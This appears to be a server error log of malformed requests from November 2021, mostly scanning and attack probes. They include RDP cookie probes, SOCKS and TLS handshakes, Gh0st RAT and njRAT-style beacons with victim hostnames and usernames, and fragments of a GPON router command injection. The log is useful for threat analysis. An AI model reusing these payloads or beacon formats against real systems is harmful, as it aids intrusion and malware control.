7@@94.232.43.63 - - [27/Nov/2021:00:36:31 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
8@@94.232.43.63 - - [27/Nov/2021:00:36:31 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
126@@5.188.210.227 - - [27/Nov/2021:06:35:27 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
128@@5.188.210.227 - - [27/Nov/2021:06:36:50 +0000] "\x04\x01\x00P\x05\xBC\xD2\xE3\x00" 400 166 "-" "-"@@list index out of range
138@@178.128.194.144 - - [27/Nov/2021:07:00:46 +0000] "238\x00ll|'|'|SGFjS2VkX0Q3NUU2QUFB|'|'|WIN-QZN7FJ7D1O|'|'|Administrator|'|'|18-11-28|'|'||'|'|Win 7 Ultimate SP1 x64|'|'|No|'|'|S17|'|'|..|'|'|SW5ib3ggLSBPdXRsb29rIERhdGEgRmlsZSAtIE1pY3Jvc29mdCBPdXRsb29rAA==|'|'|" 400 166 "-" "-"@@list index out of range
163@@94.232.43.63 - - [27/Nov/2021:09:19:25 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
164@@94.232.43.63 - - [27/Nov/2021:09:19:25 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
171@@205.185.124.100 - - [27/Nov/2021:09:50:55 +0000] "" 400 0 "-" "-"@@list index out of range
269@@94.232.43.63 - - [26/Nov/2021:00:47:26 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
270@@94.232.43.63 - - [26/Nov/2021:00:47:26 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
273@@66.240.205.34 - - [26/Nov/2021:01:10:59 +0000] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 166 "-" "-"@@list index out of range
397@@20.68.10.178 - - [26/Nov/2021:05:04:50 +0000] "" 400 0 "-" "-"@@list index out of range
419@@172.104.131.24 - - [26/Nov/2021:06:46:35 +0000] "R\x93\x00\x00\xFF\xFF\xFF\xFF\x005ABC\x00" 400 166 "-" "-"@@list index out of range
421@@205.185.124.100 - - [26/Nov/2021:07:05:10 +0000] "" 400 0 "-" "-"@@list index out of range
481@@27.115.124.106 - - [26/Nov/2021:09:06:05 +0000] "\x16\x03\x01\x00\xB2\x01\x00\x00\xAE\x03\x03TsV\xD3\x88\xC9" 400 166 "-" "-"@@list index out of range
717@@5.188.210.227 - - [26/Nov/2021:17:23:29 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
718@@5.188.210.227 - - [26/Nov/2021:17:25:16 +0000] "\x04\x01\x00P\x05\xBC\xD2\xE3\x00" 400 166 "-" "-"@@list index out of range
748@@34.77.162.27 - - [26/Nov/2021:19:43:17 +0000] "\x16\x03\x01\x00\xE5\x01\x00\x00\xE1\x03\x03\xB0\xDE\x0F\xCE6\xD5R\xCFR\xE7\x88g\x91\xBAm\xDC\xE3\x98a\xE9\xD02i\x11\xD2\xCF\x04\xE6\xE6\xDB$\xD2\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
749@@94.232.43.63 - - [26/Nov/2021:19:46:59 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
750@@94.232.43.63 - - [26/Nov/2021:19:46:59 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
762@@71.6.158.166 - - [26/Nov/2021:20:36:59 +0000] "" 400 0 "-" "-"@@list index out of range
763@@71.6.158.166 - - [26/Nov/2021:20:37:00 +0000] "" 400 0 "-" "-"@@list index out of range
764@@71.6.158.166 - - [26/Nov/2021:20:37:01 +0000] "" 400 0 "-" "-"@@list index out of range
769@@71.6.158.166 - - [26/Nov/2021:20:37:10 +0000] "\x03uE\xA1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
810@@20.55.53.144 - - [17/Nov/2021:00:53:40 +0000] "\x9E\x1E\xA4Z\x11\x90I\xC7`/\xEA" 400 166 "-" "-"@@list index out of range
854@@66.240.205.34 - - [17/Nov/2021:02:24:58 +0000] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 166 "-" "-"@@list index out of range
959@@167.71.102.181 - - [17/Nov/2021:05:53:34 +0000] "\x00\x0E8\x8A\xA52v\xA3,[\xF3\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
967@@143.244.133.162 - - [17/Nov/2021:06:33:10 +0000] "\x16\x03\x01\x01\xFE\x01\x00\x01\xFA\x03\x03v\xAA{\xE7\x90\xEF^\x8B_\x89p\xED\x18\xAB\xF9\xC9\x97Z\xF9\x0CY87\x04\xBA\xE4\x97\xE1\xDEE\x97\xEB\x00\x01<\xCC\x14\xCC\x13\xCC\x15\xC00\xC0,\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
970@@164.52.24.179 - - [17/Nov/2021:07:23:11 +0000] "\x16\x03\x01\x01 \x01\x00\x01\x1C\x03\x03O\xC5Qh\xEDp\xF7\xDAB{\xC2\xD3\xA0g\xA5\xFD\xCC\xF3\x06\xFC(&e\xFF\xF1b\x0CX\xD7\xD08= P@\x00M@\x90~\x14\x17\x18;\xEE\x88MJb\xE5H\x01\xC0\xB5#\x17ga\x12\x1DLn]\xBCn\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 166 "-" "-"@@list index out of range
971@@164.52.24.179 - - [17/Nov/2021:07:23:12 +0000] "\x16\x03\x01\x00\xBD\x01\x00\x00\xB9\x03\x03\xB5#\xDE\xD7\xB2\x845cW\xBBo\x86p~\xDE\x1E\x19\x90{\xF6\xB3\x16\x81\xCE\xB1\x18M\x18)FNY\x00\x008\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 166 "-" "-"@@list index out of range
972@@164.52.24.179 - - [17/Nov/2021:07:23:12 +0000] "\x16\x03\x01\x00c\x01\x00\x00_\x03\x02\xC8)\xDE\xC2f=\xB7d\xB5\x188\x80\xB2\x82\x0C\x92\xB91\xC5ol%D\xA0\x04\x9A\xA7\x10\xB9M\x17h\x00\x00\x12\xC0" 400 166 "-" "-"@@list index out of range
973@@164.52.24.179 - - [17/Nov/2021:07:23:13 +0000] "\x16\x03\x01\x00c\x01\x00\x00_\x03\x01\xC3\xA1\xAD7\x8B\xC2\xE8ku\xF7K\xFE\xFE\xA7\xBB\xF4wJUV\x80\xB0nw\x16\xDA\x8B\xDD\xAD&\xBA1\x00\x00\x12\xC0" 400 166 "-" "-"@@list index out of range
993@@138.68.249.116 - - [17/Nov/2021:09:39:37 +0000] "SSTP_DUPLEX_POST /sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/ HTTP/1.1" 400 166 "-" "-"@@list index out of range
1026@@194.165.16.111 - - [17/Nov/2021:12:17:15 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
1027@@194.165.16.111 - - [17/Nov/2021:12:17:17 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
1094@@77.83.36.32 - - [17/Nov/2021:15:42:45 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
1096@@64.227.97.195 - - [17/Nov/2021:16:01:37 +0000] "\x00\x0E8\x09\x1A*@gFC\xA8\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
1112@@45.61.186.13 - - [17/Nov/2021:17:05:30 +0000] "" 400 0 "-" "-"@@list index out of range
1278@@172.104.131.24 - - [16/Nov/2021:02:39:05 +0000] "R\x93\x00\x00\xFF\xFF\xFF\xFF\x005ABC\x00" 400 166 "-" "-"@@list index out of range
1387@@185.254.31.134 - - [16/Nov/2021:08:21:20 +0000] "\x16\x03\x01\x01C\x01\x00\x01?\x03\x03\xB9\xAA\x0C\xF5U\xA1\xE6^\xAATP\xCA\x83" 400 166 "-" "-"@@list index out of range
1434@@222.186.19.235 - - [16/Nov/2021:10:25:41 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
1442@@59.99.140.36 - - [16/Nov/2021:11:01:58 +0000] "h+/tmp/gpon80&ipv=0" 400 166 "-" "-"@@list index out of range
1484@@45.61.186.13 - - [16/Nov/2021:14:05:36 +0000] "" 400 0 "-" "-"@@list index out of range
1485@@34.77.162.8 - - [16/Nov/2021:14:25:28 +0000] "\x16\x03\x01\x00\xE5\x01\x00\x00\xE1\x03\x03\xFBw\xA7\xC5\x86\x93\xC6\x05s:s\xEEOe\xB1k\xBA\x9A.D\x85\xC9<\x95\xD9\xC4Y\x04\xC0!1o\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
1507@@3.90.177.61 - - [16/Nov/2021:15:17:50 +0000] "\x15\x03\x01\x00\x02\x02P" 400 166 "-" "-"@@list index out of range
1508@@3.90.177.61 - - [16/Nov/2021:15:17:50 +0000] "\x15\x03\x01\x00\x02\x02P" 400 166 "-" "-"@@list index out of range
1566@@143.198.204.243 - - [16/Nov/2021:17:43:58 +0000] "" 400 0 "-" "-"@@list index out of range
1639@@185.181.102.18 - - [16/Nov/2021:22:34:23 +0000] "\x03\xEE1\x94a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
1727@@125.64.94.144 - - [15/Nov/2021:02:02:23 +0000] "\x5Cx01\x5Cx00\x5Cx00\x5Cx00 \x5Cxbf\x5Cx02\x5Cx00\x5Cx88\x5Cx13\x5Cx00\x5Cx00\x5Cx87\x5Cx00\x5Cx00\x5Cx00NIMABIJIAN\x5Cx04\x5Cx03\x5Cx00\x5Cx00{\x5Cx99Caig\x5Cx9c\x5Cx03\x5Cxc7eB\x5Cxc5\x5Ct\x5Cxc1\x5Cx18a\x5Cx11\x5Cx1a\x5Cx91\x5Cx1f\x5Cx02\x5Ctcof\x5Cx91\x5Cxc0\x5Cx80sJ5\x5Cxd2\x5Cx80\x5Cxe6\x5Cx9a~\x5Cxb9\x5Cxc7\x5Cx83^\x5Cx96\x5CxeeN\x5Cx16\x5Cx96\x5Cx96&\x5Cxe6\x5Cx03\x5Cxea\x5Cxbc\x5Cx81\x5Cx02=\x5Cxac\x5Cx10\x5Cxfa?7\x5Cx03\x5Cxc3\x5Cxdf\x5Cxf7\x5Cxe4\x5Cx98`p\x5Cxe6\x5Cx8d\x5Cxc1\x5Cxa9\x5Cx8d\x5Cxc6\x5Cx06\x5Cxdb\x5Cxaf\x5Cx91\x5Cxe7\x5Cx82s\x5Cxf7\x5Cx14H\x5Cxd4\x5Cxe1W\x5Cx9a\x5Cx93C\x5Cx9e]\x5Cxa4\x5Cx01#\x5Cx03#\x5Cx03]\x5Cx03c]CC\x5Cx05C\x5Cx03+S\x5Cx03b\x5Cxf4\x5Cx00\x5Cx00/\x5Cx9e\x5Cx16E" 400 166 "-" "-"@@list index out of range
1787@@54.242.191.231 - - [15/Nov/2021:03:26:46 +0000] "\x15\x03\x01\x00\x02\x02P" 400 166 "-" "-"@@list index out of range
1797@@54.242.191.231 - - [15/Nov/2021:03:26:47 +0000] "\x15\x03\x01\x00\x02\x02P" 400 166 "-" "-"@@list index out of range
1809@@139.59.69.106 - - [15/Nov/2021:04:28:10 +0000] "\x16\x03\x01\x01\xFE\x01\x00\x01\xFA\x03\x03O\x85X+w\xA0Y(V2\xBE\xCB\xB1\x1A\x91s\x01\xFB\xD7\xACjIC\xBA'\xC0\xCA\xB6\x81./Q\x00\x01<\xCC\x14\xCC\x13\xCC\x15\xC00\xC0,\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
2084@@66.240.205.34 - - [15/Nov/2021:05:42:35 +0000] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" 400 166 "-" "-"@@list index out of range
2086@@20.55.53.144 - - [15/Nov/2021:05:54:42 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\x9D\xEF\x92\x07\x22\xDA\x19 \x87\x1A\xACC\xD2x\xAC$\xB3\x07\xD6I#he[P\xA9\xD4\xEC\x89\xDE\x96\x22 \x00&\x9A\xFEa\xA5\xC9\xFB\x86\xE8\xEC\x9A\xFC\xEA\xF7\x9F\xBFR\xFE]o\xA3\xF6{\x19Z\xE1H\xE4a\xB8!\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 166 "-" "-"@@list index out of range
2089@@20.55.53.144 - - [15/Nov/2021:06:06:43 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\x96M\x88\xE9B\xF2\xE4D\xBE\xA8\x10\xDF\xAC*x9\xE9\x8B\x18\x10#\xBE" 400 166 "-" "-"@@list index out of range
2145@@138.68.249.116 - - [15/Nov/2021:10:39:13 +0000] "SSTP_DUPLEX_POST /sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/ HTTP/1.1" 400 166 "-" "-"@@list index out of range
2229@@143.198.204.243 - - [15/Nov/2021:11:45:42 +0000] "" 400 0 "-" "-"@@list index out of range
2268@@89.248.165.52 - - [15/Nov/2021:12:51:43 +0000] "\x04\x01\x00\x19h/\x0C!\x00" 400 166 "-" "-"@@list index out of range
2269@@89.248.165.52 - - [15/Nov/2021:12:51:43 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
2352@@89.248.165.52 - - [15/Nov/2021:16:33:05 +0000] "\x04\x01\x00PU\xCE\xA0s\x00" 400 166 "-" "-"@@list index out of range
2353@@89.248.165.52 - - [15/Nov/2021:16:33:05 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
2397@@222.186.19.235 - - [15/Nov/2021:21:59:34 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x8D\x5C\xA6\xD9" 400 166 "-" "-"@@list index out of range
2398@@222.186.19.235 - - [15/Nov/2021:21:59:34 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
2429@@161.35.236.158 - - [15/Nov/2021:22:45:15 +0000] "\x00\x0E8`x\x1CV\xCFqP\xDC\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
2498@@223.112.202.248 - - [15/Nov/2021:23:59:54 +0000] "sh+/tmp/gpon80&ipv=0" 400 166 "-" "-"@@list index out of range
2584@@142.93.34.237 - - [14/Nov/2021:04:10:16 +0000] "" 400 0 "-" "-"@@list index out of range
